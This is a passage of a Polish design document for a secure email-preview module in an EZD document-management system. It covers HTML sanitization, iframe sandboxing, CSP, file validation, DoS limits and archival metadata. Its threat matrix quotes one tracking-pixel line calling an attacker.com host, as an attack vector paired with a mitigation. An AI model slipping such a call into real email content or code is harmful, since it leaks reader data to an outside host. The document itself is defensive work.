do konkretnej koszulki (reużywa <code>ezd_require_access()</code>).</p>

<pre><code>GET /ezd/mail_preview.php
    ?file_id=123       // ID pliku w tabeli ezd_dokumenty_pliki
    &sprawa_id=456     // ID koszulki — weryfikacja uprawnień

// Odpowiedź (200 OK)
{
  "ok": true,
  "format": "msg",    // lub "eml"
  "subject": "Odpowiedź na zapytanie ofertowe",
  "from":    {"display": "Jan Kowalski", "email": "jan@firma.pl"},
  "to":      [{"display": "Anna Nowak", "email": "a.nowak@feer.org.pl"}],
  "cc":      [],
  "bcc":     [],
  "date":    "2026-07-31T10:22:00Z",
  "message_id": "abc@mail.firma.pl",
  "in_reply_to": null,
  "body_html":  "...",  // sanitized HTML lub null
  "body_text":  "...",  // fallback
  "attachments": [
    {"id": 1, "filename": "projekt.docx", "mime": "...", "size": 45678, "cid": null}
  ]
}

GET /ezd/mail_attachment.php
    ?file_id=123&att_id=1&token={HMAC}
// Odpowiedź: binarny strumień pliku (Content-Disposition: attachment)</code></pre>

<div class="note">
  <b>Token HMAC dla załącznika:</b> <code>hash_hmac('sha256', "$file_id:$att_id:$user_id", APP_HMAC_KEY)</code>.
  Token jest jednorazowy i ważny 15 minut — przechowywany w sesji PHP, nie w bazie.
</div>


<h3 id="cache">1.6 Buforowanie parsowania</h3>
<p>Parsowanie OLE dużego .msg może zajmować 200–800 ms. Wynik powinien być buforowany
tak długo, jak plik nie zmienił się w EZD storage.</p>

<pre><code>// Klucz cache: hash SHA-256 ścieżki pliku + mtime
$cache_key = 'mail_parsed_' . hash('sha256', $file_path . ':' . filemtime($file_path));

// Rekomendowany backend: APCu (szybki, in-process, bez zewnętrznych zależności)
if (apcu_exists($cache_key)) {
    return apcu_fetch($cache_key);
}
$parsed = do_parse($file_path);
apcu_store($cache_key, $parsed, 3600); // TTL 1 h
return $parsed;</code></pre>
</section>


<!-- =================================================== BEZPIECZEŃSTWO == -->
<section id="zagrozenia">
<h2>2. Bezpieczeństwo i sanitaryzacja <a class="anchor" href="#zagrozenia">#</a></h2>

<h3>2.0 Macierz zagrożeń</h3>
<div class="tablewrap"><table>
<tr><th>Zagrożenie</th><th>Wektor</th><th>Ryzyko</th><th>Mitygacja</th></tr>
<tr class="risk-high">
  <td><strong>XSS Stored</strong></td>
  <td>Złośliwy HTML/JS w ciele wiadomości</td>
  <td><span class="pill danger">Krytyczne</span></td>
  <td>HTML Purifier + renderowanie w sandboxed iframe z CSP</td>
</tr>
<tr class="risk-high">
  <td><strong>SSRF via tracking pixels</strong></td>
  <td><code>&lt;img src="http://attacker.com/track?id=..."&gt;</code></td>
  <td><span class="pill danger">Wysokie</span></td>
  <td>Usunięcie zewnętrznych <code>src</code> i CID → data URI; blokada sieciowa w iframe CSP</td>
</tr>
<tr class="risk-high">
  <td><strong>Zip Bomb / DoS</strong></td>
  <td>Gigantyczny .msg z zagnieżdżonymi załącznikami</td>
  <td><span class="pill danger">Wysokie</span></td>
  <td>Limit rozmiaru pliku (max 50 MB), limit liczby załączników, timeout parsowania</td>
</tr>
<tr class="risk-med">
  <td><strong>Path Traversal</strong></td>
  <td>Manipulacja parametrem <code>file_id</code></td>
  <td><span class="pill warn">Średnie</span></td>
  <td>Tylko ID numeryczne; ścieżka wyznaczana przez EZD storage, nie przez input użytkownika</td>
</tr>
<tr class="risk-med">
  <td><strong>XXE (XML External Entity)</strong></td>
  <td>Złośliwy XML w załączniku OOXML (.docx w .msg)</td>
  <td><span class="pill warn">Średnie</span></td>
  <td>Nie parsujemy automatycznie XML z załączników; Libxml2: <code>LIBXML_NONET</code></td>
</tr>
<tr class="risk-med">
  <td><strong>Buffer overflow</strong></td>
  <td>Zniekształcony plik OLE z anomalnymi rozmiarami sektorów</td>
  <td><span class="pill warn">Średnie</span></td>
  <td>Użycie sprawdzonej biblioteki (hfig/msg-parser); limit czasu egzekucji PHP (<code>set_time_limit(15)</code>)</td>
</tr>
<tr class="risk-low">
  <td><strong>Clickjacking wewnętrzny</strong></td>
  <td>Złośliwe linki w e-mailu klikane przez użytkownika</td>
  <td><span class="pill">Niskie</span></td>
  <td>Otwieranie linków w nowej karcie (<code>target="_blank" rel="noopener"</code>) z ostrzeżeniem</td>
</tr>
</table></div>


<h3 id="xss-html">2.1 Sanitaryzacja HTML — HTML Purifier</h3>
<p>Treść HTML z wiadomości NIGDY nie trafia bezpośrednio do DOM. Przed renderowaniem
przechodzi przez <a href="http://htmlpurifier.org/">HTML Purifier</a> z rygorystyczną
konfiguracją dozwolonych elementów.</p>

<pre><code>// composer require ezyang/htmlpurifier

function sanitize_email_html(string $raw_html): string {
    static $purifier = null;
    if (!$purifier) {
        $config = HTMLPurifier_Config::createDefault();
        $config->set('HTML.Allowed',
            'p,br,b,strong,i,em,u,s,del,ins,small,sup,sub,' .
            'h1,h2,h3,h4,h5,h6,' .
            'ul,ol,li,dl,dt,dd,' .
            'table,thead,tbody,tr,th,td,caption,' .
            'blockquote,q,cite,' .
            'a[href|title],img[src|alt|width|height],' .
            'pre,code,span[style],div[style],' .
            'hr,figure,figcaption'
        );
        // Dozwolone style (ograniczony podzbiór CSS)
        $config->set('CSS.AllowedProperties',
            'color,background-color,font-size,font-weight,font-style,' .
            'text-decoration,text-align,margin,padding,border,width,height'
        );
        // Wymuszenie noopener na linkach
        $config->set('HTML.TargetBlank', true);
        $config->set('HTML.TargetNoreferrer', true);
        // Zakaz URL javascript: i data: w atrybutach href
        $config->set('URI.AllowedSchemes', ['http' => true, 'https' => true, 'mailto' => true]);
        // ZAKAZ ładowania zewnętrznych zasobów (CID już zastąpione data URI)
        $config->set('URI.DisableExternalResources', true);
        $purifier = new HTMLPurifier($config);
    }
    return $purifier->purify($raw_html);
}</code></pre>

<div class="note warn">
  <b>Ważne:</b> Przed wywołaniem HTML Purifier należy zastąpić wszystkie referencje
  <code>cid:</code> w atrybutach <code>src</code> danymi base64 obrazu
  (<code>data:image/...;base64,...</code>). HTML Purifier następnie usuwa wszelkie
  pozostałe zewnętrzne URL z atrybutów <code>src</code> dzięki
  <code>URI.DisableExternalResources</code>.
</div>

<pre><code>// Krok 1: zamień cid: → data URI
function replace_cid_with_data_uri(string $html, array $attachments): string {
    foreach ($attachments as $att) {
        if (!$att['cid']) continue;
        $cid     = preg_quote($att['cid'], '/');
        $data_uri = 'data:' . $att['mime'] . ';base64,' . $att['data_b64'];
        $html = preg_replace('/cid:' . $cid . '/i', $data_uri, $html);
    }
    // Usuń wszystkie pozostałe cid: (bez pasującego załącznika)
    $html = preg_replace('/cid:[^\s"\']+/i', '', $html);
    return $html;
}

// Krok 2: sanitaryzacja
$safe_html = sanitize_email_html(replace_cid_with_data_uri($raw_html, $attachments));</code></pre>


<h3 id="sandboxing">2.2 Sandboxing — renderowanie w iframe</h3>
<p>Nawet po sanitaryzacji, treść HTML e-maila renderujemy w izolowanym
<code>&lt;iframe&gt;</code> z atrybutem <code>sandbox</code>. Eliminuje to
wiele klas ataków poprzez odcięcie skryptów i dostępu do rodzica.</p>

<pre><code>&lt;!-- Fragment widoku podglądu (ezd/mail_viewer.php) --&gt;
&lt;iframe
  id="mail-body-frame"
  sandbox="allow-same-origin"
  referrerpolicy="no-referrer"
  style="width:100%;border:none;min-height:300px"
  srcdoc="&lt;!--treść z PHP echo htmlspecialchars($safe_html, ENT_QUOTES)--&gt;"
&gt;&lt;/iframe&gt;</code></pre>

<div class="note key">
  <b>Dlaczego <code>sandbox="allow-same-origin"</code> a nie puste?</b>
  Puste <code>sandbox</code> blokuje m.in. formularz i linki; <code>allow-same-origin</code>
  pozwala iframe'owi na dostęp do cookies w tej samej domenie — ale bez <code>allow-scripts</code>
  żaden JS nie może się wykonać. Dozwolone jest wyłącznie renderowanie HTML+CSS.
  Nie dodawać <code>allow-scripts</code> — to unieważniłoby piaskownicę.
</div>

<h4>Dynamiczne dostosowanie wysokości iframe</h4>
<pre><code>// Bez allow-scripts w sandboxie — użyj ResizeObserver po załadowaniu przez parent
const frame = document.getElementById('mail-body-frame');
frame.addEventListener('load', () => {
  // Tylko jeśli same-origin jest włączone można odczytać scrollHeight
  try {
    frame.style.height = frame.contentDocument.body.scrollHeight + 'px';
  } catch {
    frame.style.height = '600px'; // fallback
  }
});
// Alternatywa: srcdoc z calc(min-content) i overflow:auto wewnątrz</code></pre>


<h3 id="csp">2.3 Polityka CSP dla strony z podglądem</h3>
<p>Strona <code>/ezd/mail_viewer.php</code> (parent) powinna mieć surowszą politykę CSP
niż reszta EZD, ze względu na potencjalnie niebezpieczną treść w dziecku.</p>

<pre><code>// W mail_viewer.php — nagłówki HTTP
header("Content-Security-Policy: " .
    "default-src 'self'; " .
    "script-src 'self' 'nonce-{$nonce}'; " .    // nonce generowany per-request
    "style-src 'self' 'unsafe-inline'; " .       // Bootstrap wymaga inline styles
    "img-src 'self' data:; " .                   // data: dla inline obrazów w CID
    "frame-src 'self'; " .                       // iframe z srcdoc — 'self'
    "connect-src 'none'; " .                     // żadne fetch/XHR
    "object-src 'none'; " .
    "base-uri 'self';"
);</code></pre>

<h3 id="file-validation">2.4 Walidacja pliku wejściowego</h3>
<pre><code>function validate_email_file(string $path): string {
    if (!is_readable($path)) {
        throw new RuntimeException('Plik niedostępny');
    }
    $size = filesize($path);
    if ($size > 50 * 1024 * 1024) {    // 50 MB limit
        throw new RuntimeException("Plik zbyt duży: {$size} bajtów");
    }
    // Magic bytes
    $fh    = fopen($path, 'rb');
    $magic = fread($fh, 8);
    fclose($fh);
    // OLE2: D0 CF 11 E0 A1 B1 1A E1
    if (str_starts_with($magic, "\xD0\xCF\x11\xE0")) {
        return 'msg';
    }
    // MIME: zaczyna się od nagłówka RFC 5322 (From:/Received:/MIME-Version:)
    if (preg_match('/^(From |Received:|MIME-Version:|Date:|Message-ID:)/i',
        file_get_contents($path, length: 256))) {
        return 'eml';
    }
    throw new RuntimeException('Nierozpoznany format pliku (nie jest .msg ani .eml)');
}

// Ochrona przed DoS podczas parsowania
set_time_limit(15);
ini_set('memory_limit', '256M');</code></pre>

<h3 id="dos">2.5 Limity antyDoS</h3>
<div class="tablewrap"><table>
<tr><th>Parametr</th><th>Limit</th><th>Gdzie ustawiony</th></tr>
<tr><td>Rozmiar pliku</td><td>50 MB</td><td><code>validate_email_file()</code></td></tr>
<tr><td>Liczba załączników</td><td>100</td><td>Pętla w <code>collect_msg_attachments()</code></td></tr>
<tr><td>Rozmiar pojedynczego załącznika (podgląd)</td><td>20 MB</td><td>Endpoint <code>mail_attachment.php</code></td></tr>
<tr><td>Głębokość zagnieżdżenia wiadomości</td><td>5</td><td>Parametr <code>$depth</code> w rekurencji</td></tr>
<tr><td>Czas parsowania PHP</td><td>15 sekund</td><td><code>set_time_limit(15)</code></td></tr>
<tr><td>Limit pamięci PHP</td><td>256 MB</td><td><code>ini_set('memory_limit')</code></td></tr>
<tr><td>Rozmiar wygenerowanego HTML (po sanitaryzacji)</td><td>5 MB</td><td>Sprawdzenie <code>strlen()</code> przed zwrotem</td></tr>
</table></div>
</section>


<!-- ===================================================== UX ============ -->
<section id="widok">
<h2>3. Interfejs użytkownika (Frontend) <a class="anchor" href="#widok">#</a></h2>

<h3 id="naglowki">3.1 Nagłówki wiadomości — makieta</h3>
<p>Nagłówki wyświetlamy w szyku zbliżonym do klasycznego klienta pocztowego (Outlook/Gmail),
ale z elementami EZD (możliwość kliknięcia „Zarejestruj jako pismo").</p>

<div class="mail-mockup">
  <div class="mm-hdr">
    <h5>Podgląd wiadomości e-mail</h5>
    <div class="mm-row"><span class="mm-label">Temat</span><span class="mm-val"><strong>Odpowiedź na zapytanie ofertowe nr 2026/07/45</strong></span></div>
    <div class="mm-row"><span class="mm-label">Od</span><span class="mm-val">Jan Kowalski &lt;<a>jan.kowalski@kontrahent.pl</a>&gt; <span class="pill">zewnętrzny</span></span></div>
    <div class="mm-row"><span class="mm-label">Do</span><span class="mm-val">Anna Nowak &lt;<a>a.nowak@feer.org.pl</a>&gt;</span></div>
    <div class="mm-row"><span class="mm-label">DW</span><span class="mm-val">Biuro Umów &lt;<a>biuro@feer.org.pl</a>&gt;</span></div>
    <div class="mm-row"><span class="mm-label">Data</span><span class="mm-val">31 lipca 2026, 10:22 <span class="pill">(UTC+2)</span></span></div>
    <div class="mm-row"><span class="mm-label">ID</span><span class="mm-val" style="font-family:monospace;font-size:.78rem;color:var(--ink-3)">abc123@mail.kontrahent.pl</span></div>
  </div>
  <div class="mm-body">
    <p>Szanowna Pani Nowak,</p>
    <p>W odpowiedzi na zapytanie ofertowe przekazujemy w załączeniu przygotowaną przez nas ofertę cenową...</p>
    <p style="color:var(--ink-3);font-style:italic;font-size:.88rem">— Jan Kowalski, Dział Handlowy, Kontrahent Sp. z o.o.</p>
  </div>
  <div class="mm-att">
    <div class="mm-att-chip">📄 <span class="ext">DOCX</span> oferta_cenowa_2026.docx <span style="color:var(--ink-3);font-size:.75rem;margin-left:.3rem">45 KB</span></div>
    <div class="mm-att-chip">📊 <span class="ext">XLSX</span> kalkulacja.xlsx <span style="color:var(--ink-3);font-size:.75rem;margin-left:.3rem">128 KB</span></div>
    <div class="mm-att-chip" style="border-color:var(--ok);color:var(--ok)">✅ oferta_cenowa_2026.docx <span style="font-size:.75rem;margin-left:.3rem">zarejestrowany w EZD</span></div>
  </div>
</div>

<h4>Zasady wyświetlania nagłówków</h4>
<ul>
  <li><strong>UDW (BCC)</strong> — wyświetlane tylko jeśli zalogowany użytkownik jest odbiorcą BCC lub adminem EZD. Dla pozostałych pole ukryte.</li>
  <li><strong>Zewnętrzne adresy</strong> (<code>@feer.org.pl</code> brak) — oznaczane chipem <span class="pill warn">zewnętrzny</span>.</li>
  <li><strong>Data</strong> — wyświetlana w formacie lokalnym (pl-PL), z podaniem strefy czasowej; na hover — pełny ISO-8601 w tooltip.</li>
  <li><strong>Message-ID</strong> — wyświetlany skrócony (pierwsze 30 znaków + „..."), pełny po kliknięciu; skopiuj do schowka.</li>
  <li><strong>Przycisk „Rozwiń szczegóły"</strong> — odkrywa: X-Mailer, X-Spam-Score, Received (hopsy), pełne nagłówki raw.</li>
</ul>


<h3 id="tresci">3.2 Renderowanie treści</h3>

<div class="tablewrap"><table>
<tr><th>Przypadek</th><th>Zachowanie</th></tr>
<tr>
  <td>Wiadomość HTML</td>
  <td>Renderuj w sandboxed iframe (<code>srcdoc</code>). Przycisk „Pokaż jako tekst" przełącza do wersji plain text.</td>
</tr>
<tr>
  <td>Wiadomość plain text (brak HTML)</td>
  <td>Render w <code>&lt;pre style="white-space:pre-wrap"&gt;</code>. Autolink — konwertuj URL-e tekstowe na klikalne <code>&lt;a&gt;</code> (po walidacji <code>FILTER_VALIDATE_URL</code>).</td>
</tr>
<tr>
  <td>Tylko RTF (stare .msg bez HTML/text)</td>
  <td>Fallback do konwersji: <code>proc_open('unrtf --html')</code> → sanitaryzacja → iframe. Ostrzeżenie UI: „Treść skonwertowana z RTF — formatowanie może być niedokładne".</td>
</tr>
<tr>
  <td>Wiadomość pusta</td>
  <td>Informacja: „Wiadomość nie zawiera treści tekstowej."</td>
</tr>
<tr>
  <td>Historia korespondencji (forwarded)</td>
  <td>Linia horyzontalna + zwinięta sekcja „Wiadomość przekazana" z własnym mini-nagłówkiem (Od/Do/Data). Zwijana domyślnie jeśli >3 poziomy.</td>
</tr>
</table></div>

<h4>Obsługa linków w treści</h4>
<pre><code>// HTML Purifier już dodaje target=_blank. Dopiero przez JS dodaj ostrzeżenie
// PRZED otwarciem linku zewnętrznego:
document.getElementById('mail-body-frame').contentDocument
  ?.querySelectorAll('a[href^="http"]')
  .forEach(a => {
    a.addEventListener('click', e => {
      if (!confirm('Zamierzasz otworzyć zewnętrzny link:\n' + a.href + '\n\nKontynuować?')) {
        e.preventDefault();
      }
    }, true);
  });
// Uwaga: wymaga allow-scripts w sandbox — rozważ obsługę po stronie srcdoc content</code></pre>

<div class="note warn">
  <b>Kompromis:</b> Ostrzeżenie przed linkami wymaga <code>allow-scripts</code> w iframe
  (co osłabia sandbox). Alternatywa: inject do <code>srcdoc</code> minimalnego skryptu
  walidacyjnego generowanego serwerowo z <code>nonce</code> — ale wyklucza to
  użycie <code>srcdoc</code> z CSP. W v1 rekomendujemy brak <code>allow-scripts</code>
  i brak ostrzeżenia — linki otwierają się z <code>target="_blank" rel="noopener"</code>.
</div>


<h3 id="watki">3.3 Wątki korespondencji</h3>
<p>EZD może grupować wiadomości w wątek na podstawie pól
<code>Message-ID</code>, <code>In-Reply-To</code> i <code>References</code>.</p>

<div class="flow">
  <div class="node"><b>Wiadomość A</b><span>Message-ID: abc@server</span></div>
  <div class="arr">→</div>
  <div class="node"><b>Wiadomość B</b><span>In-Reply-To: abc@server</span></div>
  <div class="arr">→</div>
  <div class="node"><b>Wiadomość C</b><span>References: abc@server bcd@server</span></div>
  <div class="arr">→</div>
  <div class="node"><b>Widok wątku</b><span>drzewo chronologiczne</span></div>
</div>

<p>Wątek budowany jest lokalnie z plików .msg/.eml zarejestrowanych w tej samej koszulce EZD
(bez wywołań do serwera pocztowego). Widok: lista wiadomości posortowana chronologicznie,
z wcięciem wizualnym dla odpowiedzi.</p>


<h3 id="zalaczniki-ux">3.4 Panel załączników</h3>
<ul>
  <li><strong>Chip z ikoną MIME</strong> — rozszerzenie pliku + ikona (PDF/DOC/XLS/IMG/ZIP/inne). Klik → pobierz przez bezpieczny endpoint HMAC.</li>
  <li><strong>„Podgląd w EZD"</strong> — dla PDF, obrazów, DOCX (Office Online): otwarcie w nowej karcie przez istniejący mechanizm <code>office_online.php</code>.</li>
  <li><strong>„Zarejestruj jako dokument"</strong> — rejestracja załącznika jako osobnego pisma lub pliku w bieżącej koszulce (wywołanie API EZD). Po rejestracji chip zmienia kolor na <span class="pill ok">zarejestrowany</span>.</li>
  <li><strong>Zagnieżdżona wiadomość</strong> — chip z ikoną ✉️ otwiera rekurencyjny podgląd w tym samym widoku (nowe panele poniżej lub w modalu).</li>
  <li><strong>Zaproszenie kalendarza .ics</strong> — chip z ikoną 📅, podgląd: Organizator / Czas / Miejsce / Opis.</li>
</ul>

<h4>Masowe działania na załącznikach</h4>
<pre><code>// Wieloselekcja checkboxami → dropdown akcji:
// [Pobierz zaznaczone (ZIP)] [Zarejestruj zaznaczone w EZD]
// Endpoint ZIP:
POST /ezd/mail_attachments_zip.php
{ "file_id": 123, "att_ids": [1, 3, 5] }
// Odpowiedź: strumień ZIP z Content-Disposition: attachment; filename="zalaczniki.zip"</code></pre>


<h3 id="responsive">3.5 Responsywność</h3>
<ul>
  <li><strong>Desktop (≥992 px):</strong> Widok dwukolumnowy — lewa: lista wiadomości w koszulce; prawa: podgląd aktywnej wiadomości. Panel załączników poniżej treści.</li>
  <li><strong>Tablet (768–991 px):</strong> Lista wiadomości zwijana do offcanvas; podgląd zajmuje całą szerokość.</li>
  <li><strong>Mobile (&lt;768 px):</strong> Widok jednokolumnowy, przełączanie Lista ↔ Podgląd przez zakładki. Nagłówki zwinięte do mini-kart. Treść: <code>overflow-x:auto</code> dla tabel w e-mailu HTML.</li>
  <li><strong>iframe wysokość:</strong> Auto-resize przez ResizeObserver (same-origin), fallback: <code>min-height:60vh</code>.</li>
</ul>

<h4>Tabele w HTML e-mailach</h4>
<pre><code>/* Opakowanie iframe */
.mail-body-wrap {
  position: relative;
  width: 100%;
  overflow-x: auto;   /* tabele w e-mailu mogą być szersze niż viewport */
  border: 1px solid var(--line);
  border-radius: 0 0 var(--radius) var(--radius);
}
iframe#mail-body-frame {
  width: 100%;
  min-height: 200px;
  border: none;
  display: block;
}</code></pre>


<h3 id="akcesibilnosc">3.6 Dostępność (WCAG AA)</h3>
<div class="tablewrap"><table>
<tr><th>Wymaganie</th><th>Implementacja</th></tr>
<tr><td>Semantyka nagłówków</td><td>Nagłówki wiadomości w <code>&lt;dl&gt;&lt;dt&gt;&lt;dd&gt;</code>, nie w tabelach layoutowych</td></tr>
<tr><td>Kontrast</td><td>Min. 4.5:1 dla tekstu (tokeny CSS z przewodnika; ciemny motyw zachowuje ratios)</td></tr>
<tr><td>Fokus klawiatury</td><td>Wszystkie chipy załączników i przyciski — <code>:focus-visible</code> z outline 2px</td></tr>
<tr><td>Role ARIA</td><td><code>role="region" aria-label="Treść wiadomości"</code> dla iframe; <code>aria-live="polite"</code> dla statusów ładowania</td></tr>
<tr><td>Alt dla obrazów inline</td><td>Obrazy CID: atrybut <code>alt</code> z nazwy załącznika; nieznany → <code>alt="Obraz osadzony"</code></td></tr>
<tr><td>Iframe tytuł</td><td><code>&lt;iframe title="Treść wiadomości e-mail"&gt;</code> — wymagane przez screen readery</td></tr>
</table></div>
</section>


<!-- ================================================= KANCELARIA ======= -->
<section id="metadane-arch">
<h2>4. Kwestie kancelaryjno-prawne <a class="anchor" href="#metadane-arch">#</a></h2>

<h3 id="instrukcja">4.1 Instrukcja kancelaryjna — wiadomości e-mail jako dokumenty</h3>
<p>Zgodnie z Rozporządzeniem Prezesa Rady Ministrów w sprawie instrukcji kancelaryjnej
(Dz.U. 2011 nr 14 poz. 67 ze zm.) — wiadomość e-mail dotycząca sprawy urzędowej
stanowi <strong>dokument elektroniczny</strong> w rozumieniu przepisów o archiwizacji
i powinna być rejestrowana w EZD analogicznie do pisma papierowego.</p>

<div class="note key">
  <b>Kluczowa zasada:</b> Rejestracji w Rejestrze Przesyłek Wpływających (RPW) wymaga
  każda wiadomość e-mail dotycząca <em>sprawy</em> — nie prywatna korespondencja
  wewnętrzna. Wiadomość przechowywana wyłącznie jako plik .msg/.eml bez rejestracji
  w RPW <strong>nie spełnia wymagań kancelaryjnych</strong>.
</div>

<h3 id="metadane-arch-pola">4.2 Wymagane metadane archiwalne</h3>
<p>Rejestrując wiadomość pocztową w EZD (pismo przychodzące lub wychodzące),
system powinien automatycznie wypełnić pola metadanych z parsera:</p>

<div class="tablewrap"><table>
<tr><th>Pole w EZD (ezd_pisma)</th><th>Źródło z parsera</th><th>Wymagane</th><th>Uwagi</th></tr>
<tr>
  <td><code>tytul</code></td>
  <td><code>subject</code></td>
  <td><span class="pill acc">Tak</span></td>
  <td>Prefiks [RE:] / [FW:] stripowany lub zachowany — zależy od polityki org.</td>
</tr>
<tr>
  <td><code>data_pisma</code></td>
  <td><code>date</code> (ISO-8601 UTC)</td>
  <td><span class="pill acc">Tak</span></td>
  <td>Data wysłania, nie data wpływu. Data wpływu = czas rejestracji w EZD.</td>
</tr>
<tr>
  <td><code>nadawca_nazwa</code></td>
  <td><code>from.display</code></td>
  <td><span class="pill acc">Tak</span></td>
  <td>Imię i nazwisko lub nazwa firmy.</td>
</tr>
<tr>
  <td><code>nadawca_email</code></td>
  <td><code>from.email</code></td>
  <td><span class="pill acc">Tak</span></td>
  <td>Przechowywany jako dodatkowe pole (niestandardowe, ale kluczowe dla e-mail)</td>
</tr>
<tr>
  <td><code>odbiorcy</code></td>
  <td><code>to</code> + <code>cc</code></td>
  <td><span class="pill">Tak</span></td>
  <td>JSON lub tekstowo; BCC pomijane w metadanych pisma (prywatność)</td>
</tr>
<tr>
  <td><code>tresc_skrocona</code></td>
  <td>Pierwsze 200 znaków <code>body_text</code></td>
  <td><span class="pill">Zalecane</span></td>
  <td>Pomaga w późniejszym wyszukiwaniu bez otwierania pliku</td>
</tr>
<tr>
  <td><code>nr_ref_zewnetrzny</code></td>
  <td><code>message_id</code></td>
  <td><span class="pill">Zalecane</span></td>
  <td>Identyfikator unikalny wiadomości — umożliwia deduplifikację</td>
</tr>
<tr>
  <td><code>rodzaj_pisma</code></td>
  <td>— (wybór użytkownika)</td>
  <td><span class="pill acc">Tak</span></td>
  <td>Pismo przychodzące / wychodzące / wewnętrzne — nie można wywnioskować z samego e-maila</td>
</tr>
<tr>
  <td>Plik źródłowy .msg/.eml</td>
  <td>Cały plik binarny</td>
  <td><span class="pill acc">Tak</span></td>
  <td>Przechowywany jako załącznik pisma — jest oryginałem dokumentu elektronicznego</td>
</tr>
</table></div>


<h3 id="dowod">4.3 Wiadomość e-mail jako dowód — integralność</h3>
<p>W EZD plik .msg/.eml musi być przechowywany <strong>bez modyfikacji</strong> —
parsowanie i podgląd zachodzą wyłącznie po stronie serwera, nigdy nie modyfikując oryginału.
Dla spraw wymagających wyższego poziomu dowodowego (postępowania, sądy, kontrole):</p>

<ul>
  <li><strong>Skrót SHA-256</strong> pliku zapisywany przy rejestracji do kolumny
  <code>file_checksum</code> w <code>ezd_dokumenty_pliki</code> — możliwość
  weryfikacji integralności w każdej chwili.</li>
  <li><strong>Znacznik czasu wpływu</strong> — kolumna <code>created_at</code>
  w tabeli pisma z dokładnością do sekundy (UTC).</li>
  <li><strong>Podpis cyfrowy S/MIME</strong> — jeśli wiadomość zawiera podpis
  (<code>Content-Type: multipart/signed</code>), w v1 wyświetlamy informację
  „Wiadomość zawiera podpis cyfrowy — weryfikacja niedostępna w v1". Weryfikacja
  planowana w v2 (openssl_pkcs7_verify).</li>
  <li><strong>Zaszyfrowane wiadomości S/MIME</strong> — wyświetlamy komunikat
  „Wiadomość zaszyfrowana — wymaga prywatnego klucza odbiorcy. Odszyfruj lokalnie
  i zaimportuj ponownie."</li>
</ul>

<div class="note warn">
  <b>Pułapka — forwarding:</b> Użytkownik może przekazać wiadomość przez Outlook
  (Fwd:), co generuje NOWY plik .msg z datą przekazania, nie oryginałem.
  EZD powinien to wykryć (pole <code>in_reply_to</code> lub prefiks Fwd: w temacie)
  i ostrzegać: „Rejestrujesz wiadomość przekazaną, nie oryginał. Data: [data_fwd].
  Oryginał może być w załączniku." Sprawdź załączniki zagnieżdżone.
</div>


<h3 id="rejestracja">4.4 Przepływ rejestracji wiadomości w EZD</h3>
<div class="flow">
  <div class="node"><b>Plik .msg/.eml</b><span>wpłynął do koszulki</span></div>
  <div class="arr">→</div>
  <div class="node"><b>Podgląd</b><span>mail_viewer.php</span></div>
  <div class="arr">→</div>
  <div class="node"><b>Decyzja</b><span>użytkownik: czy rejestrować?</span></div>
  <div class="arr">→</div>
  <div class="node"><b>RPW</b><span>auto-wypełnienie z metadanych</span></div>
  <div class="arr">→</div>
  <div class="node"><b>Koszulka</b><span>przypisanie do klasy JRWA</span></div>
  <div class="arr">→</div>
  <div class="node"><b>Dekretacja</b><span>przekazanie referentowi</span></div>
</div>

<h4>Deduplication wiadomości</h4>
<p>Jeśli ta sama wiadomość (ten sam <code>Message-ID</code>) jest rejestrowana po raz drugi,
EZD powinien ostrzec: „Wiadomość o tym Message-ID jest już zarejestrowana w koszulce #X
jako pismo #Y. Czy mimo to rejestrować?" — zapobiega duplikatom wpisów w RPW.</p>

<pre><code>// Sprawdzenie deduplication przed rejestracją:
SELECT p.id, p.nr_pisma, s.sygnatura
FROM ezd_pisma p
JOIN ezd_sprawy s ON s.id = p.sprawa_id
WHERE p.nr_ref_zewnetrzny = ? -- message_id
LIMIT 1</code></pre>
</section>


<!-- ================================================= IMPLEMENTACJA ===== -->
<section id="pliki-impl">
<h2>Plan wdrożenia <a class="anchor" href="#pliki-impl">#</a></h2>

<h3>Mapa plików (nowe i modyfikowane)</h3>
<div class="tablewrap"><table>
<tr><th>Ścieżka</th><th>Typ</th><th>Opis</th></tr>
<tr>
  <td class="col-key">includes/email_parser.php</td>
  <td><span class="pill">Nowy</span></td>
  <td>Główna warstwa parsowania — <code>parse_email_file()</code>, normalizacja, cache APCu</td>
</tr>
<tr>
  <td class="col-key">includes/email_sanitizer.php</td>
  <td><span class="pill">Nowy</span></td>
  <td>Sanitaryzacja HTML (HTML Purifier), zamiana CID → data URI, HMAC tokeny dla załączników</td>
</tr>
<tr>
  <td class="col-key">ezd/mail_preview.php</td>
  <td><span class="pill">Nowy</span></td>
  <td>Endpoint JSON GET — zwraca sparsowaną wiadomość z weryfikacją uprawnień EZD</td>
</tr>
<tr>
  <td class="col-key">ezd/mail_viewer.php</td>
  <td><span class="pill">Nowy</span></td>
  <td>Widok HTML podglądu — nagłówki + iframe + panel załączników; ładowany jako offcanvas lub strona</td>
</tr>
<tr>
  <td class="col-key">ezd/mail_attachment.php</td>
  <td><span class="pill">Nowy</span></td>
  <td>Pobieranie pojedynczego załącznika (weryfikacja HMAC, stream binarny)</td>
</tr>
<tr>
  <td class="col-key">ezd/mail_attachments_zip.php</td>
  <td><span class="pill">Nowy</span></td>
  <td>Pobieranie wielu załączników jako ZIP (POST z tablicą att_ids)</td>
</tr>
<tr>
  <td class="col-key">ezd/dokumenty/index.php</td>
  <td><span class="pill warn">Modyfikacja</span></td>
  <td>Dodanie przycisku „Podgląd e-mail" dla plików .msg/.eml w liście załączników</td>
</tr>
<tr>
  <td class="col-key">ezd/pisma/register_email.php</td>
  <td><span class="pill">Nowy</span></td>
  <td>Formularz rejestracji wiadomości w RPW — auto-wypełnienie z metadanych + weryfikacja duplikatów</td>
</tr>
<tr>
  <td class="col-key">vendor/ (Composer)</td>
  <td><span class="pill">Zależności</span></td>
  <td><code>hfig/msg-parser</code>, <code>zbateson/mail-mime-parser</code>, <code>ezyang/htmlpurifier</code></td>
</tr>
</table></div>

<h3 id="etapy">Etapy implementacji</h3>
<div class="tablewrap"><table>
<tr><th>Etap</th><th>Zakres</th><th>Szacunek</th></tr>
<tr>
  <td><strong>1. Parser + endpoint</strong></td>
  <td><code>email_parser.php</code>, <code>email_sanitizer.php</code>, <code>mail_preview.php</code> — bez UI</td>
  <td>2–3 dni</td>
</tr>
<tr>
  <td><strong>2. Widok nagłówków + iframe</strong></td>
  <td><code>mail_viewer.php</code> — nagłówki, iframe treści, pasek narzędzi</td>
  <td>1–2 dni</td>
</tr>
<tr>
  <td><strong>3. Panel załączników</strong></td>
  <td>Lista chipów, pobieranie HMAC, rejestracja w EZD, ZIP</td>
  <td>2 dni</td>
</tr>
<tr>
